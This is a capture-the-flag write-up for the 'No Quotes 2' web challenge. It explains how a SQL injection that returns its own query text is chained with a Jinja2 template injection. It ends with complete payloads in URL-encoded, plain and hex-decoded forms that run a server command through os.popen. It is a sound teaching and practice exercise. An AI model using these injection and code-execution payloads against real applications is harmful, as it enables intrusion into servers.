#### No Quotes 2
- points earned: 44
#### Notes / Intuition
- This challenge is the same as `No Quotes` with exception to the username/password check below.
```python
if not username == row[0] or not password == row[1]:
	return render_template(
		"login.html",
		error="Invalid credentials.",
		username=username,
	)
```
- This checks that username and password that the sql statement returns is the same as the username/password that was provided in the `POST /login` request.
- `No Quotes 2` also returns username and password from the sql query rather then id and username.
```python
query = (
	"SELECT username, password FROM users "
	f"WHERE username = ('{username}') AND password = ('{password}')"
)
```
- This means that the result of the sql injection must contain a row where the username contains an SSTI payload and the password is the sql injection payload which is data provided to the `password=` parameter in the `POST /login` request.
- This is a little tricky because you cannot just paste in the sql injection due to redundancy.
- To resolve this issue, the idea of `SELECT info FROM information_schema.processList WHERE id=connection_id()` can be used to output the current query.
- So essentially the result of the sql injection must contain
	- The SSTI payload
	- The current query... `SELECT info FROM information_schema.processList WHERE id=connection_id()`
- The output of this query will contain the entire sql query but only a portion of it is needed to match the `password=` param. To resolve this issue `substring()` can be used to parse out exactly what is needed.
- Since the username is the SSTI payload `{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}` and the username is checked for `'` and `"` we need to use something like `bytes([0x6f, 0x73]).decode()` to generate strings.  This example creates `'os'`.
- Since `bytes()` does not exist within the context of the Jinja2 template something like `self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()` must be used to get a reference to `bytes()`.
#### Solution
- Here's the url encoded payload
```
username={{self.__init__.__globals__.__builtins__.__import__(self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()).popen(self.__init__.__globals__.__builtins__.bytes([0x2f,0x72,0x65,0x61,0x64,0x66,0x6c,0x61,0x67]).decode()).read()}}\&password=%29%20union%20select%200x7b7b73656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e5f5f696d706f72745f5f2873656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e6279746573285b307836662c307837335d292e6465636f64652829292e706f70656e2873656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e6279746573285b307832662c307837322c307836352c307836312c307836342c307836362c307836632c307836312c307836375d292e6465636f64652829292e7265616428297d7d5c%2Csubstring%28info%2C315%2C579%29%20from%20information%5Fschema%2EprocessList%20where%20id%3Dconnection%5Fid%28%29%23
```
- Here's the payload without url encoding
```
username={{self.__init__.__globals__.__builtins__.__import__(self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()).popen(self.__init__.__globals__.__builtins__.bytes([0x2f,0x72,0x65,0x61,0x64,0x66,0x6c,0x61,0x67]).decode()).read()}}\&password=) union select 0x7b7b73656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e5f5f696d706f72745f5f2873656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e6279746573285b307836662c307837335d292e6465636f64652829292e706f70656e2873656c662e5f5f696e69745f5f2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e6279746573285b307832662c307837322c307836352c307836312c307836342c307836362c307836632c307836312c307836375d292e6465636f64652829292e7265616428297d7d5c,substring(info,315,579) from information_schema.processList where id=connection_id()#
```
- here's the payload without hex encoding
```
username={{self.__init__.__globals__.__builtins__.__import__(self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()).popen(self.__init__.__globals__.__builtins__.bytes([0x2f,0x72,0x65,0x61,0x64,0x66,0x6c,0x61,0x67]).decode()).read()}}\&password=) union select '{{self.__init__.__globals__.__builtins__.__import__(self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()).popen(self.__init__.__globals__.__builtins__.bytes([0x2f,0x72,0x65,0x61,0x64,0x66,0x6c,0x61,0x67]).decode()).read()}}\',substring(info,315,579) from information_schema.processList where id=connection_id()#
```